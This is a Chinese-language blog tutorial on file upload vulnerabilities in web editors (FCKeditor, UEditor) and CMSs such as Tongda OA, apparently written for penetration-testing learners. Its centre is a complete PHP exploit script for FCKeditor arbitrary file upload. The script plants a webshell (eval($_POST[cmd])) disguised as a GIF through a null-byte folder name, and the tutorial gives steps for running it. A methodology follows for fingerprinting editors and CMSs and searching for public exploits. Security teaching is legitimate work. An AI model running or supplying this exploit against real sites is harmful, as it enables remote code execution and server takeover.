# 原创
：  编辑器文件上传简介及演示-CMS文件上传简介及演示-文件上传漏洞分析详细流程

# 编辑器文件上传简介及演示-CMS文件上传简介及演示-文件上传漏洞分析详细流程

## 一、编辑器文件上传简介

在某些网站里，可能会套用第三方的编辑器，来对图片、音频、文章等做相关处理，因此如果网站内有编辑器的话，编辑器的类型、版本也是我们进行渗透的一个点，大部分的编辑器漏洞都是文件上传漏洞。

## 二、fckeditor编辑器文件上传实例
1. 打开本地搭建的fckeditor编辑器站点（真正情况不是下面的样式）。1. 正常情况下是类似下面的样式，如果在网上看到类似下面的页面，就说明这个网站是有编辑器的，但是其类型、版本可能不同。1. 这个编辑器是UEditor，版本是1.4.3。1. 是由百度开发出来的。1. 通过搜索引擎在网上寻找此编辑器的漏洞，网上相关漏洞是有很多的。也就是说如果你能识别出对方网站所使用的编辑器，并且知道编辑器的路径地址，就可以根据编辑器的相应漏洞进行攻击。1. 回到我们刚开始打开的fckeditor编辑器，那么可能会问，你是怎么知道是fckeditor编辑器的呢？可以根据网页的路径，或者扫到的相关的文件来进行判断。1. 根据上图知道了此编辑器的名称以及版本，去搜索引擎去搜索相关漏洞。1. 将网上搜索到的exp进行复制。1. 在本地新建一个fck.php文件保存上面exp。
```
&lt;?php
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
define(STDIN, fopen("php://stdin", "r"));
$match = array();
function http_send($host, $packet)
{
$sock = fsockopen($host, 80);
while (!$sock)
{
print "\n[-] No response from {$host}:80 Trying again...";
$sock = fsockopen($host, 80);
}
fputs($sock, $packet);
while (!feof($sock)) $resp .= fread($sock, 1024);
fclose($sock);
print $resp;
return $resp;
}
function connector_response($html)
{
global $match;
return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) &amp;&amp; in_array($match[1], array(0, 201)));
}
print "\n+------------------------------------------------------------------+";
print "\n|         FCKEditor Servelet Arbitrary File Upload Exploit         |";
print "\n+------------------------------------------------------------------+\n";
if ($argc &lt; 3)
{
print "\nUsage......: php $argv[0] host path\n";
print "\nExample....: php $argv[0] localhost /\n";
print "\nExample....: php $argv[0] localhost /FCKEditor/\n";
die();
}
$host = $argv[1];
$path = ereg_replace("(/){2,}", "/", $argv[2]);
$filename = "fvck.gif";
$foldername = "fuck.php%00.gif";
$connector = "editor/filemanager/connectors/php/connector.php";
$payload = "-----------------------------265001916915724\r\n";
$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
$payload .= "Content-Type: image/jpeg\r\n\r\n";
$payload .= 'GIF89a'."\r\n".'&lt;?php eval($_POST[cmd]) ?&gt;'."\n";
$payload .= "-----------------------------265001916915724--\r\n";
$packet = "POST {$path}{$connector}?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=".$foldername." HTTP/1.0\r\n";//print $packet;
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;
print $packet;
if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");
else print "\n[-] Job done! try http://${host}/$match[2] \n";
?&gt;
```
1. 将这个文件拖到php的安装目录里。1. 在当前目录创建一个cmd文件。1. 输入以下命令运行php文件。1. 输入以下命令进行上传。1. 上传完成，访问给出的路径即可。1. 可以看到文件成功被上传上来了。
## 三、如何判断使用的什么编辑器
1. 进入网站的会员中心或者后台中心可以看到其使用编辑器的情况。1. 使用文件扫描，观察编辑器的相关路径。1. eg 11. eg 21. eg 3
## 四、CMS文件上传简介

在网上有很多网站开源原码（简称CMS）,CMS原码也可能会有相应的文件上传漏洞，只需要在网上查找相应漏洞，便可以进行突破。

## 五、通达OA系统文件上传实例
1. 对其进行配置。1. 配置完成后打开页面。1. 正常看到这个界面后去搜索引擎内进行搜索。1. 打开网页后可以看到exp。
## 六、文件上传漏洞分析流程

在拿到一个网站后，如果单纯想从文件上传方面分析漏洞，流程如下所示。
1. 首先要看中间件，确定其是否存在解析漏洞。1. 确定存在漏洞后，接下来就要寻找文件上传点了。1. 可以通过字典扫面，也可以通过会员中心等位置。1. 如果没有解析漏洞的话，就可以进行对文件上传方面检测的分析和绕过了。1. 此时就要判断对方是黑名单还是白名单还是基于内容的验证了。1. 确定之后就可以按照对应方法进行绕过了。1. 如果在这方面依然没办法进行绕过，就可以考虑网站的CMS了，因为CMS也可能会爆出一些网站的漏洞。1. 如果CMS方面也没有漏洞，就可以在网站上寻找有没有编辑器了。1. 可以通过字典扫描，或者查看网站的会员中心或者后台来看到编辑器的类型以及版本。1. 得到编辑器的信息之后，就可以到搜索引擎内搜索相关漏洞了。1. 如果这方面依然不行，就可以查看CVE编号漏洞了，看网上最近有没有爆出相关的CVE编号漏洞。1. 如果上面所有方面均测试完成了还没有找到漏洞，那么大概率就是不存在文件上传漏洞了。